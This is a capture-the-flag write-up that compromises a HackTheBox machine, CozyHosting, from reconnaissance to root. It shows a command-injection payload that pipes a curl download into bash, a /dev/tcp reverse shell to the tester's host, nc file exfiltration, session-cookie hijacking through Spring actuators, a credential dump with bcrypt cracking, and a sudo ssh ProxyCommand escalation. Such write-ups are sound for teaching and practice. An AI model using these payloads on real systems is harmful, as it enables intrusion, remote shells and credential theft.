# CozyHosting

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV 10.129.108.203
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 19:05 UTC
Nmap scan report for 10.129.108.203
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/2%OT=22%CT=1%CU=43499%PV=Y%DS=2%DC=I%G=Y%TM=64F387B7
OS:%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=104%GCD=1%ISR=105%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53
OS:AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=N)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=N)T1(R=Y%DF=
OS:Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE(R=
OS:Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT        ADDRESS
1   234.82 ms  10.10.16.1
2   1040.38 ms 10.10.16.1
3   1064.66 ms 10.10.16.1
4   ... 12
13  1107.79 ms 10.10.16.1
14  1122.01 ms 10.10.16.1
15  1122.03 ms 10.10.16.1
16  ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.97 seconds
```

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.108.203
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 19:08 UTC
Nmap scan report for cozyhosting.htb (10.129.108.203)
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=9/2%OT=22%CT=1%CU=36683%PV=Y%DS=2%DC=T%G=Y%TM=64F3884A
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(SP=10
OS:7%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53A
OS:NNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W
OS:3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%
OS:IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   24.84 ms 10.10.16.1
2   24.89 ms cozyhosting.htb (10.129.108.203)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.66 seconds
```

```c
$ sudo nmap -sV -sU 10.129.108.203
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 19:09 UTC
Nmap scan report for cozyhosting.htb (10.129.108.203)
Host is up (0.048s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE VERSION
68/udp open|filtered dhcpc

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1109.46 seconds
```

### Enumeration of Port 80/TCP

> http://10.129.108.203/

We got redirected to `cozyhosting.htb` and added it to our `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.108.203  cozyhosting.htb
```

> http://cozyhosting.htb/

```c
$ whatweb http://cozyhosting.htb/
http://cozyhosting.htb/ [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Email[info@cozyhosting.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.108.203], Lightbox, Script, Title[Cozy Hosting - Home], UncommonHeaders[x-content-type-options], X-Frame-Options[DENY], X-XSS-Protection[0], nginx[1.18.0]
```

> http://cozyhosting.htb/index.html

```c
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Sat Sep 02 19:12:04 UTC 2023
There was an unexpected error (type=Not Found, status=404).
```

### Directory Busting with dirsearch

```c
$ dirsearch -u http://cozyhosting.htb/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/username/.dirsearch/reports/cozyhosting.htb/-_23-09-02_19-07-08.txt

Error Log: /home/username/.dirsearch/logs/errors-23-09-02_19-07-08.log

Target: http://cozyhosting.htb/

[19:07:08] Starting: 
[19:07:16] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[19:07:25] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[19:07:26] 400 -  435B  - /a%5c.aspx                                        
[19:07:26] 200 -   48B  - /actuator/sessions                                
[19:07:27] 200 -  634B  - /actuator                                         
[19:07:27] 200 -   15B  - /actuator/health                                  
[19:07:27] 200 -    5KB - /actuator/env                                     
[19:07:27] 200 -   10KB - /actuator/mappings                                
[19:07:27] 200 -  124KB - /actuator/beans                                   
[19:07:27] 401 -   97B  - /admin                                            
[19:07:48] 200 -    0B  - /engine/classes/swfupload//swfupload.swf          
[19:07:48] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[19:07:48] 500 -   73B  - /error                                            
[19:07:49] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[19:07:49] 200 -    0B  - /extjs/resources//charts.swf                      
[19:07:52] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf            
[19:07:53] 200 -   12KB - /index                                            
[19:07:57] 200 -    0B  - /login.wdm%2e                                     
[19:07:57] 200 -    4KB - /login                                            
[19:07:58] 204 -    0B  - /logout                                           
[19:08:09] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF                       
                                                                             
Task Completed
```

## Foothold

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators

> http://cozyhosting.htb/actuator

> http://cozyhosting.htb/actuator/env

> http://cozyhosting.htb/actuator/sessions

```c
$ curl http://cozyhosting.htb/actuator/sessions
{"8120A844ED7F6BFBFCBC26B07374C5BB":"kanderson","8D951C01B8ADB4848AB1D8CE8823CCA8":"UNAUTHORIZED"}
```

| Username |
| --- |
| kanderson |

> http://cozyhosting.htb/actuator/mappings

```c
            {
              "handler": "htb.cloudhosting.compliance.ComplianceService#executeOverSsh(String, String, HttpServletResponse)",
              "predicate": "{POST [/executessh]}",
              "details": {
                "handlerMethod": {
                  "className": "htb.cloudhosting.compliance.ComplianceService",
                  "name": "executeOverSsh",
                  "descriptor": "(Ljava/lang/String;Ljava/lang/String;Ljakarta/servlet/http/HttpServletResponse;)V"
                },
                "requestMappingConditions": {
                  "consumes": [],
                  "headers": [],
                  "methods": [
                    "POST"
                  ],
                  "params": [],
                  "patterns": [
                    "/executessh"
                  ],
                  "produces": []
                }
              }
            },
```

We just can replace the `cookie` with the value of `kanderson` and access `/admin`.

1. Access /login
2. curl http://cozyhosting.htb/actuator/sessions | jq
3. Create a cookie if necessary with the name `JSESSIONID` and the value `C21D67192C16CD19F927058CF2123B47`.
4. Access /admin

By adding a new host we found `Command Injection`.

Modified Request:

```c
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 28
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=AB553784F40F48363DF9442B3777B65D
Connection: close

host=127.0.0.1&username=;id;
```

```c
$ cat x
bash -i >& /dev/tcp/10.10.16.12/9001 0>&1
```

> https://stackoverflow.com/questions/12235373/using-the-internal-field-separator-with-curl

Modfied Request:

```c
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Length: 54
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://cozyhosting.htb/admin
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=AB553784F40F48363DF9442B3777B65D
Connection: close

host=127.0.0.1&username=;curl${IFS}10.10.16.12/x|bash;
```

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.108.203] 59626
bash: cannot set terminal process group (997): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$
```

## Stabilizing Shell

```c
app@cozyhosting:/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
app@cozyhosting:/app$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                            
$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

app@cozyhosting:/app$ 
app@cozyhosting:/app$ export XTERM=xterm
```

```c
app@cozyhosting:/app$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

```c
app@cozyhosting:/app$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```c
app@cozyhosting:/app$ nc 10.10.16.12 9002 < cloudhosting-0.0.1.jar
```

```c
$ nc -lnvp 9002 > cloudhosting-0.0.1.jar
listening on [any] 9002 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.108.203] 44600
```

```c
$ zipgrep password cloudhosting-0.0.1.jar 2>/dev/null 
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
BOOT-INF/classes/application.properties:spring.datasource.password=V<--- SNIP --->R
```

| Password |
| --- |
| V<--- SNIP --->R |

```c
app@cozyhosting:/app$ psql -U postgres -W -h localhost
Password: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

```c
postgres=# \l
WARNING: terminal is not fully functional
Press RETURN to continue 
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
eges   
-------------+----------+----------+-------------+-------------+----------------
-------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres    
      +
             |          |          |             |             | postgres=CTc/po
stgres
(4 rows)
```

```c
postgres=# \c cozyhosting
```

```c
cozyhosting=# \dt                               
WARNING: terminal is not fully functional
Press RETURN to continue 
         List of relations
 Schema | Name  | Type  |  Owner   
--------+-------+-------+----------
 public | hosts | table | postgres
 public | users | table | postgres
(2 rows)
```

```c
cozyhosting=# select * from users;
WARNING: terminal is not fully functional
Press RETURN to continue 
   name    |                           password                           | role
  
-----------+--------------------------------------------------------------+-----
--
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admi
n
(2 rows)
```

## Cracking the Hash

We cracked the hash for `admin`.

| Hash |
| --- |
| $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm |

```c
$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m<--- SNIP --->d (?)     
1g 0:00:00:23 DONE (2023-09-03 06:06) 0.04187g/s 117.5p/s 117.5c/s 117.5C/s catcat..keyboard
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

| Password |
| --- |
| m<--- SNIP --->d |

```c
app@cozyhosting:/app$ su josh
Password: 
josh@cozyhosting:/app$
```

## user.txt

```c
josh@cozyhosting:~$ cat user.txt 
5020a7fe17d015b8a39f2f9c63ae7550
```

## Pivoting

```c
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
```

```c
josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

> https://gtfobins.github.io/gtfobins/ssh/#sudo

```c
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0<&2 1>&2' x
#
```

## root.txt

```c
# cat /root/root.txt
1cd7abb1ed1ef967a7231e2e0089dc8e
```
